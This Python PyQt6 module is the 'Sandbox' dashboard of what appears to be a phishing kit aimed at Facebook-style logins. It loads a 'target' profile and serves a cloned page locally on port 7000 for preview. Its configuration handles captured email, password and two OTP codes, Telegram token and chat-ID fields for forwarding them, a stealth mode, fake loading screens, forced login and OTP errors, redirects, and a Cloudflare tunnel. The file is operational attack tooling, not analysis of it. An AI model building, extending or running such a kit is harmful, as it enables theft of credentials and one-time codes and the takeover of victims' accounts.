"""sandbox_window.py — auto-generated from Release.py."""

import sys
import os
import time
import threading
import subprocess
import socket
import requests
from werkzeug.serving import make_server
from datetime import datetime
from PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QLabel, QTextEdit, QGroupBox, QSplitter, QRadioButton, QCheckBox, QFrame, QScrollArea, QDialog, QGridLayout, QTabWidget, QFileDialog, QComboBox, QMenu, QInputDialog, QStyle, QStyleOptionButton, QMessageBox, QListWidget, QListWidgetItem, QAbstractItemView
from PyQt6.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QVariantAnimation, QAbstractAnimation
from PyQt6.QtGui import QTextCursor, QFont, QColor, QCursor, QPainter
import json
import base64
from routes import app
from config import active_servers, sandbox_config, get_cfg, TARGETS_DIR, BASE_CONFIG, TRASH_DIR, is_target_hidden, set_target_hidden, rename_target_meta, remove_target_meta, mask_name, is_hide_names
from widgets import BounceButton, TextEditorDialog, PublicationDialog, ModernToggleSwitch
from helpers import is_port_in_use, ajouter_log, BANNER_ASCII, log_error

from ._header import BANNER_ASCII, BASE_CONFIG, BounceButton, ModernToggleSwitch, QComboBox, QHBoxLayout, QLabel, QMessageBox, QTextCursor, QTextEdit, QTimer, QVBoxLayout, QWidget, TARGETS_DIR, ajouter_log, app, button_manager, is_port_in_use, json, log_error, log_error_to_file, make_server, os, sandbox_config, socket, threading
from .target_config import TargetConfigWindow

class SandboxWindow(QWidget):
    def __init__(self, main_win):
        super().__init__()
        self.main_win = main_win
        self.setWindowTitle("Sandbox Mode - Tableau de bord")
        self.setMinimumSize(600, 500)
        self._apply_theme_style()

        layout = QVBoxLayout(self)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        # Header controls
        header = QHBoxLayout()
        header.addWidget(QLabel("<b>Cible à copier :</b>"))
        
        self.combo_targets = QComboBox()
        self.refresh_targets()
        header.addWidget(self.combo_targets)

        # Modern Toggle Switch for Sandbox
        sandbox_toggle_layout = QHBoxLayout()
        sandbox_toggle_layout.addWidget(QLabel("Sandbox:"))
        self.toggle_sandbox_switch = ModernToggleSwitch(size="medium")
        self.toggle_sandbox_switch.setToolTip("Sandbox Mode\n⚫ OFF | 🟢 ON")
        self.toggle_sandbox_switch.toggled.connect(self._handle_sandbox_toggle)
        sandbox_toggle_layout.addWidget(self.toggle_sandbox_switch)
        sandbox_toggle_layout.addStretch()
        header.addLayout(sandbox_toggle_layout)
        
        self.btn_config = BounceButton("⚙️ Modifier")
        from theme import btn_style_warning as _bsw
        self.btn_config.setStyleSheet(_bsw())
        self.btn_config.setEnabled(False)
        self.btn_config.clicked.connect(self.open_config)
        header.addWidget(self.btn_config)
        
        self.btn_clear = BounceButton("🗑️ Clear Logs")
        from theme import btn_style_neutral as _bsn
        self.btn_clear.setStyleSheet(_bsn())
        self.btn_clear.clicked.connect(self.clear_logs)
        header.addWidget(self.btn_clear)
        
        layout.addLayout(header)

        self.lbl_status = QLabel("Statut: En attente")
        from theme import get_theme as _gt
        _t = _gt()
        self.lbl_status.setStyleSheet(f"color: {_t['text_dim']};")
        layout.addWidget(self.lbl_status)
        
        # Logs
        layout.addWidget(QLabel("<b>Logs Sandbox :</b>"))
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setHtml(BANNER_ASCII)
        layout.addWidget(self.log)

        # Timer for logs
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.maj_logs)
        self.timer.start(1000)
        self.last_logs_len = 0

    def center(self):
        qr = self.frameGeometry()
        cp = self.screen().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def showEvent(self, event):
        self.center()
        super().showEvent(event)

    def _apply_theme_style(self):
        """Build and apply the window stylesheet using the current theme colors.
        Called at __init__ and again by refresh_theme() when the theme changes.
        Does NOT modify the window structure — only colors."""
        try:
            from theme import get_theme
            t = get_theme()
            self.setStyleSheet(f"""
                QWidget {{ background-color: {t['bg']}; color: {t['text']}; font-size: 13px; }}
                QComboBox {{ background-color: {t['bg_alt']}; border: 1px solid {t['border_hover']}; padding: 8px; border-radius: 6px; color: {t['text']}; }}
                QPushButton {{ background-color: {t['accent']}; color: white; border: none; font-weight: normal; border-radius: 6px; padding: 10px; }}
                QPushButton:hover {{ background-color: {t['accent_hover']}; }}
                QTextEdit {{ background-color: {t['bg_input']}; border: 1px solid {t['border']}; border-radius: 8px; color: {t['text_dim']}; font-family: 'Consolas', monospace; }}
            """)
            # Re-apply individual button stylesheets so they pick up the new theme
            from theme import btn_style_warning, btn_style_neutral
            if hasattr(self, 'btn_config') and self.btn_config:
                self.btn_config.setStyleSheet(btn_style_warning())
            if hasattr(self, 'btn_clear') and self.btn_clear:
                self.btn_clear.setStyleSheet(btn_style_neutral())
            if hasattr(self, 'lbl_status') and self.lbl_status:
                # Preserve the current status color (green/red/gray) by re-reading the theme
                _status_text = self.lbl_status.text()
                if "En ligne" in _status_text or "en ligne" in _status_text:
                    self.lbl_status.setStyleSheet(f"color: {t['success']}; font-weight: bold;")
                elif "Arrêté" in _status_text or "arrêté" in _status_text:
                    self.lbl_status.setStyleSheet(f"color: {t['danger']};")
                else:
                    self.lbl_status.setStyleSheet(f"color: {t['text_dim']};")
        except Exception as e:
            try:
                from helpers import log_error
                log_error("SandboxWindow._apply_theme_style", e)
            except Exception:
                pass

    def maj_logs(self):
        global sandbox_config
        if sandbox_config.get("memory_logs") and self.last_logs_len != len(sandbox_config["memory_logs"]):
            self.log.setHtml(sandbox_config["memory_logs"])
            self.log.moveCursor(QTextCursor.MoveOperation.End)
            self.last_logs_len = len(sandbox_config["memory_logs"])

    def refresh_targets(self):
        """Rebuild the target dropdown.
        The visible label follows the global hide_names setting (mask_name()),
        while the raw tid is stored as Qt.UserRole so toggle_sandbox() can still
        find the correct JSON file even when names are masked."""
        try:
            # Preserve the currently selected tid across rebuilds
            current_tid = ""
            try:
                idx = self.combo_targets.currentIndex()
                if idx >= 0:
                    data = self.combo_targets.itemData(idx, Qt.ItemDataRole.UserRole)
                    if data:
                        current_tid = data
            except Exception:
                pass

            self.combo_targets.blockSignals(True)
            self.combo_targets.clear()
            new_index = 0
            if os.path.exists(TARGETS_DIR):
                tids = sorted([f.replace(".json", "") for f in os.listdir(TARGETS_DIR) if f.endswith(".json")])
                for i, tid in enumerate(tids):
                    # mask_name() returns the raw name when hide_names is OFF,
                    # and "Cible #XXXX" when hide_names is ON.
                    label = mask_name(tid)
                    self.combo_targets.addItem(label)
                    self.combo_targets.setItemData(i, tid, Qt.ItemDataRole.UserRole)
                    if tid == current_tid:
                        new_index = i
            # Restore previous selection if possible
            try:
                if self.combo_targets.count() > 0:
                    self.combo_targets.setCurrentIndex(new_index)
            except Exception:
                pass
            self.combo_targets.blockSignals(False)
        except Exception as e:
            try:
                log_error("SandboxWindow.refresh_targets", e)
            except Exception:
                pass

    def refresh_for_hide_names(self):
        """Called by parent windows when the global hide_names flag changes,
        so the combo box labels pick up the new mask state.
        Safe to call when the sandbox is running — the underlying tid selection
        is preserved via Qt.UserRole data."""
        try:
            self.refresh_targets()
            # If the sandbox is currently running, also refresh the status line
            # so the masked name appears there too.
            if sandbox_config.get("running"):
                from theme import get_theme as _gt_status
                _t_status = _gt_status()
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    lan_ip = s.getsockname()[0]
                    s.close()
                except Exception:
                    lan_ip = "127.0.0.1"
                real_tid = sandbox_config.get("target_name", "")
                masked = mask_name(real_tid) if real_tid else "Sandbox"
                self.lbl_status.setText(f"Statut: Sandbox en ligne (http://{lan_ip}:7000) — {masked}")
                self.lbl_status.setStyleSheet(f"color: {_t_status['success']}; font-weight: bold;")
        except Exception as e:
            try:
                log_error("SandboxWindow.refresh_for_hide_names", e)
            except Exception:
                pass

    def _handle_sandbox_toggle(self, state):
        """Handle toggle switch state change"""
        if state:
            self.toggle_sandbox()
        else:
            self._stop_sandbox_with_warning()

    def _stop_sandbox_with_warning(self):
        """Show a warning dialog before stopping the sandbox.
        If the sandbox config window is open, give the user the choice to
        close it first and stop, or cancel to stop manually."""
        try:
            from theme import get_theme as _gt_warn
            _t_warn = _gt_warn()

            # Check if the sandbox config window is open
            config_open = False
            if hasattr(self, 'cfg_win') and self.cfg_win:
                try:
                    from PyQt6 import sip
                    if not sip.isdeleted(self.cfg_win) and self.cfg_win.isVisible():
                        config_open = True
                except Exception:
                    if self.cfg_win.isVisible():
                        config_open = True

            if config_open:
                msg = QMessageBox(self)
                msg.setWindowTitle("Arrêter le Sandbox")
                msg.setIcon(QMessageBox.Icon.Warning)
                msg.setText("La fenêtre de configuration du Sandbox est encore ouverte.")
                msg.setInformativeText(
                    "Voulez-vous fermer la fenêtre de configuration et arrêter le Sandbox ?\n\n"
                    "• « Fermer & Arrêter » : ferme la config et arrête le Sandbox proprement.\n"
                    "• « Annuler » : garde le Sandbox actif pour pouvoir sauvegarder vos modifications."
                )
                btn_close_stop = msg.addButton("Fermer & Arrêter", QMessageBox.ButtonRole.AcceptRole)
                btn_cancel = msg.addButton("Annuler", QMessageBox.ButtonRole.RejectRole)
                msg.setDefaultButton(btn_close_stop)
                msg.setStyleSheet(f"""
                    QMessageBox {{ background-color: {_t_warn['bg']}; color: {_t_warn['text']}; }}
                    QLabel {{ color: {_t_warn['text']}; font-size: 13px; }}
                    QPushButton {{ background-color: {_t_warn['bg_alt']}; color: {_t_warn['text']}; border: 1px solid {_t_warn['border_hover']};
                                  padding: 8px 16px; border-radius: 6px; font-weight: normal; }}
                    QPushButton:hover {{ background-color: {_t_warn['border_hover']}; border-color: {_t_warn['accent']}; color: {_t_warn['accent_text']}; }}
                """)

                msg.exec()
                clicked_btn = msg.clickedButton()
                if clicked_btn is btn_cancel:
                    # User cancelled — re-enable the toggle switch, do NOT stop sandbox
                    self.toggle_sandbox_switch.set_state(True)
                    return
                # User chose "Fermer & Arrêter" — close the config window first
                try:
                    self.cfg_win.close()
                    self.cfg_win.deleteLater()
                    self.cfg_win = None
                except Exception as e:
                    log_error_to_file("SandboxWindow._stop_sandbox_with_warning.close_cfg", e)

            # Now stop the sandbox
            self.stop_sandbox()
        except Exception as e:
            log_error_to_file("SandboxWindow._stop_sandbox_with_warning", e)
            log_error("SandboxWindow._stop_sandbox_with_warning", e)
            # Fallback: stop directly
            self.stop_sandbox()
    
    def toggle_sandbox(self):
        button_id = "toggle_sandbox"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            global sandbox_config
            from theme import get_theme as _gt
            _t = _gt()
            if self.toggle_sandbox_switch.is_on:
                # Retrieve the RAW tid from Qt.UserRole — currentText() may be
                # masked ("Cible #XXXX") when hide_names is ON, which would break
                # the JSON file lookup below.
                idx = self.combo_targets.currentIndex()
                tid = self.combo_targets.itemData(idx, Qt.ItemDataRole.UserRole) if idx >= 0 else ""
                if not tid:
                    # Fallback to currentText() for backward compat (older items
                    # that may not have UserRole data after a hot-reload).
                    tid = self.combo_targets.currentText()
                if not tid: 
                    self.toggle_sandbox_switch.set_state(False)
                    return
                
                if is_port_in_use(7000):
                    QMessageBox.warning(self, "Erreur", "Le port 7000 est déjà utilisé. La Sandbox est peut-être déjà en cours d'exécution ou occupée par un autre processus.")
                    self.toggle_sandbox_switch.set_state(False)
                    return

                target_path = os.path.join(TARGETS_DIR, f"{tid}.json")
                with open(target_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                
                from config import BASE_CONFIG
                import copy
                
                # Retrieve in-memory unsaved changes if config window is open for this target
                memory_pubs = None
                if hasattr(self.main_win, 'config_win') and self.main_win.config_win and self.main_win.config_win.isVisible() and getattr(self.main_win.config_win, 'tid', None) == tid:
                    try:
                        cw = self.main_win.config_win
                        port_val = int(cw.i_port.text()) if cw.i_port.text().isdigit() else 5000
                        mode = "auto"
                        if cw.rb_auto.isChecked(): mode = "auto"
                        elif cw.rb_manuel.isChecked(): mode = "manuel"
                        elif cw.rb_transparent.isChecked(): mode = "transparent"
                        
                        data.update({
                            "display_name": cw.i_n.text(),
                            "target_name": cw.i_n.text(),
                            "target_pic": cw.i_p.text(),
                            "redirect_url": cw.i_r.text(),
                            "log_file": cw.i_l.text(),
                            "port": port_val,
                            "stealth_mode": cw.cb_stealth.isChecked(),
                            "encrypt_logs": cw.cb_encrypt_logs.isChecked() if hasattr(cw, 'cb_encrypt_logs') else False,
                            "send_telegram": cw.cb_telegram.isChecked(),
                            "telegram_token": cw.i_token.text(),
                            "telegram_chat_id": cw.i_chatid.text(),
                            "id_errors": int(cw.i_id_errors.text()) if cw.i_id_errors.text().isdigit() else 1,
                            "otp_errors": int(cw.i_otp_errors.text()) if cw.i_otp_errors.text().isdigit() else 1,
                            "save_attempts": cw.i_save_attempts.text().strip(),
                            "mode": mode,
                            "feed_enabled": cw.cb_feed.isChecked(),
                            "msg_count": int(cw.i_msg_count.text()) if cw.i_msg_count.text().isdigit() else 0,
                            "notif_count": int(cw.i_notif_count.text()) if cw.i_notif_count.text().isdigit() else 0,
                            "fake_loading_enabled": cw.cb_fake_loading.isChecked(),
                            "fake_loading_duration": int(cw.i_fake_loading_duration.text()) if cw.i_fake_loading_duration.text().isdigit() else 3,
                            "custom_otp_sub": cw.i_custom_otp_sub.text().strip(),
                            "custom_msg_restore_sub": cw.i_custom_msg_restore_sub.text().strip() if hasattr(cw, 'i_custom_msg_restore_sub') else "",
                            "ads": copy.deepcopy(cw.ads),
                            "custom_videos_dir": cw.i_videos_dir.text().strip(),
                        })
                        memory_pubs = copy.deepcopy(cw.publications)
                    except Exception:
                        pass

                sandbox_config.clear()
                sandbox_config.update(copy.deepcopy(BASE_CONFIG))
                sandbox_config.update(data)
                sandbox_config["running"] = True
                sandbox_config["port"] = 7000
                sandbox_config["target_name"] = tid

                if memory_pubs is not None:
                    sandbox_config["publications"] = memory_pubs
                    # ── Initialiser publications_by_platform avec les pubs en mémoire ──
                    if "publications_by_platform" not in sandbox_config:
                        sandbox_config["publications_by_platform"] = {}
                    _sb_platform = sandbox_config.get("platform", "facebook")
                    sandbox_config["publications_by_platform"][_sb_platform] = copy.deepcopy(memory_pubs)
                else:
                    from pub_manager import load_publications, migrate_from_json, migrate_to_per_platform
                    migrate_from_json(tid)
                    migrate_to_per_platform(tid)
                    _sb_platform = sandbox_config.get("platform", "facebook")
                    _loaded_pubs = load_publications(tid, _sb_platform)
                    sandbox_config["publications"] = _loaded_pubs
                    # ── Initialiser publications_by_platform ──
                    if "publications_by_platform" not in sandbox_config:
                        sandbox_config["publications_by_platform"] = {}
                    sandbox_config["publications_by_platform"][_sb_platform] = copy.deepcopy(_loaded_pubs)

                # Explicitly clean up active runtime fields for Sandbox isolation
                sandbox_config["memory_logs"] = BANNER_ASCII + "\n"
                sandbox_config["last_creds"] = {"email": "", "pass": "", "otp1": "", "otp2": ""}
                sandbox_config["server_instance"] = None
                sandbox_config["cloudflare_proc"] = None
                sandbox_config["public_mode"] = False
                sandbox_config["cf_url"] = "Waiting..."

                # ── Create a temporary sandbox folder by copying the target's media ──
                # This ensures the sandbox has its own isolated copy of all media files
                # (images, videos, audio, backgrounds) that can be modified without
                # affecting the original target's files.
                try:
                    from config import VIDEOS_DIR
                    import shutil
                    sandbox_video_dir = os.path.join(VIDEOS_DIR, f"sandbox_{tid}")
                    # Clean up any leftover sandbox folder from a previous run
                    if os.path.exists(sandbox_video_dir):
                        try:
                            shutil.rmtree(sandbox_video_dir)
                        except Exception as cleanup_err:
                            log_error_to_file("SandboxWindow.start_sandbox.cleanup_old", cleanup_err)
                    # Create the sandbox folder
                    os.makedirs(sandbox_video_dir, exist_ok=True)
                    # Copy all files from the original target's video directory
                    original_video_dir = os.path.join(VIDEOS_DIR, tid)
                    if os.path.exists(original_video_dir) and os.path.isdir(original_video_dir):
                        for item in os.listdir(original_video_dir):
                            src = os.path.join(original_video_dir, item)
                            dst = os.path.join(sandbox_video_dir, item)
                            try:
                                if os.path.isfile(src):
                                    shutil.copy2(src, dst)
                                elif os.path.isdir(src):
                                    shutil.copytree(src, dst, dirs_exist_ok=True)
                            except Exception as copy_err:
                                log_error_to_file(f"SandboxWindow.start_sandbox.copy[{item}]", copy_err)
                    # Point the sandbox's custom_videos_dir to the sandbox folder
                    sandbox_config["custom_videos_dir"] = sandbox_video_dir
                    sandbox_config["_sandbox_temp_dir"] = sandbox_video_dir
                    ajouter_log("SYSTEM", f"Dossier sandbox créé: {sandbox_video_dir}", "#3b82f6", force_cfg=sandbox_config)
                except Exception as e:
                    log_error_to_file("SandboxWindow.start_sandbox.temp_dir", e)
                    log_error("SandboxWindow.start_sandbox.temp_dir", e)

                threading.Thread(target=self.run_sandbox_server, daemon=True).start()
                
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    lan_ip = s.getsockname()[0]
                    s.close()
                except Exception as e:
                    log_error_to_file("SandboxWindow.get_lan_ip", e)
                    log_error("SandboxWindow.get_lan_ip", e)
                    lan_ip = "127.0.0.1"
                    
                # Use mask_name() so the log line respects the hide_names setting.
                masked_tid = mask_name(tid)
                self.lbl_status.setText(f"Statut: Sandbox en ligne (http://{lan_ip}:7000) — {masked_tid}")
                self.lbl_status.setStyleSheet(f"color: {_t['success']}; font-weight: bold;")
                self.combo_targets.setEnabled(False)
                self.btn_config.setEnabled(True)
                ajouter_log("SYSTEM", f"Sandbox started on port 7000 (Target: {masked_tid})", "#22c55e", force_cfg=sandbox_config)
            else:
                self.stop_sandbox()
        except Exception as e:
            log_error_to_file("SandboxWindow.toggle_sandbox", e)
            log_error("SandboxWindow.toggle_sandbox", e)
            self.toggle_sandbox_switch.set_state(False)
            QMessageBox.critical(self, "Erreur", f"Impossible de charger la cible: {e}")
        finally:
            button_manager.unlock_button(button_id)

    def stop_sandbox(self):
        button_id = "stop_sandbox"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return

        button_manager.lock_button(button_id)
        try:
            global sandbox_config
            from theme import get_theme as _gt
            _t = _gt()
            sandbox_config["running"] = False
            if sandbox_config.get("server_instance"):
                try:
                    import threading
                    threading.Thread(target=sandbox_config["server_instance"].shutdown, daemon=True).start()
                except Exception as e:
                    log_error_to_file("SandboxWindow.stop_sandbox", e)
                    log_error("SandboxWindow.stop_sandbox", e)
                sandbox_config["server_instance"] = None

            # ── Clean up the temporary sandbox folder ──
            # Wait a moment for the server to release file handles, then delete
            # all contents of the sandbox temp directory and the directory itself.
            temp_dir = sandbox_config.get("_sandbox_temp_dir", "")
            if temp_dir and os.path.exists(temp_dir):
                def _cleanup_sandbox_dir():
                    """Delete the sandbox temp directory in a background thread
                    to avoid blocking the UI (file handles may still be open)."""
                    try:
                        import time as _time
                        _time.sleep(2)  # Wait for server to release handles
                        import shutil
                        # Delete all contents first, then the directory itself
                        for item in os.listdir(temp_dir):
                            item_path = os.path.join(temp_dir, item)
                            try:
                                if os.path.isfile(item_path) or os.path.islink(item_path):
                                    os.remove(item_path)
                                elif os.path.isdir(item_path):
                                    shutil.rmtree(item_path)
                            except Exception as item_err:
                                log_error_to_file(f"SandboxWindow.stop_sandbox.cleanup[{item}]", item_err)
                        # Now remove the empty directory
                        try:
                            os.rmdir(temp_dir)
                        except Exception:
                            # If rmdir fails (non-empty or permissions), try rmtree
                            try:
                                shutil.rmtree(temp_dir)
                            except Exception as rmtree_err:
                                log_error_to_file("SandboxWindow.stop_sandbox.rmtree", rmtree_err)
                        try:
                            ajouter_log("SYSTEM", f"Dossier sandbox nettoyé: {temp_dir}", "#3b82f6", force_cfg=sandbox_config)
                        except Exception:
                            pass
                    except Exception as e:
                        log_error_to_file("SandboxWindow.stop_sandbox.cleanup_thread", e)
                        log_error("SandboxWindow.stop_sandbox.cleanup_thread", e)
                threading.Thread(target=_cleanup_sandbox_dir, daemon=True).start()

            # Clear sandbox config
            sandbox_config["_sandbox_temp_dir"] = ""
            sandbox_config["custom_videos_dir"] = ""

            self.toggle_sandbox_switch.set_state(False)
            self.combo_targets.setEnabled(True)
            self.btn_config.setEnabled(False)
            self.lbl_status.setText("Statut: Arrêté")
            self.lbl_status.setStyleSheet(f"color: {_t['danger']};")
            ajouter_log("SYSTEM", "Sandbox stopped", "#ef4444", force_cfg=sandbox_config)
        except Exception as e:
            log_error_to_file("SandboxWindow.stop_sandbox", e)
            log_error("SandboxWindow.stop_sandbox", e)
        finally:
            button_manager.unlock_button(button_id)

    def clear_logs(self):
        button_id = "clear_logs_sandbox"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            global sandbox_config
            sandbox_config["memory_logs"] = BANNER_ASCII + "\n"
            self.log.setHtml(sandbox_config["memory_logs"])
            self.last_logs_len = len(sandbox_config["memory_logs"])
        except Exception as e:
            log_error_to_file("SandboxWindow.clear_logs", e)
            log_error("SandboxWindow.clear_logs", e)
        finally:
            button_manager.unlock_button(button_id)

    def open_config(self):
        button_id = "open_sandbox_config"
        # Prevent multiple clicks
        if button_manager.is_locked(button_id):
            return
        
        button_manager.lock_button(button_id)
        try:
            # Use the actual target_name from sandbox_config so get_video_dir()
            # and MediaSelectorDialog can find the sandbox temp directory.
            real_tid = sandbox_config.get("target_name", "Sandbox")
            self.cfg_win = TargetConfigWindow(self.main_win, real_tid, is_sandbox=True)
            self.cfg_win.show()
            self.cfg_win.raise_()
        except Exception as e:
            log_error_to_file("SandboxWindow.open_config", e)
            log_error("SandboxWindow.open_config", e)
        finally:
            button_manager.unlock_button(button_id)

    def run_sandbox_server(self):
        global sandbox_config
        try:
            sandbox_config["server_instance"] = make_server("0.0.0.0", 7000, app)
            sandbox_config["server_instance"].serve_forever()
        except Exception as e:
            log_error_to_file("SandboxWindow.run_sandbox_server", e)
            log_error("SandboxWindow.run_sandbox_server", e)

    def closeEvent(self, event):
        self.hide()
        event.ignore()


# ═══════════════ Credentials Viewer Window ═══════════════
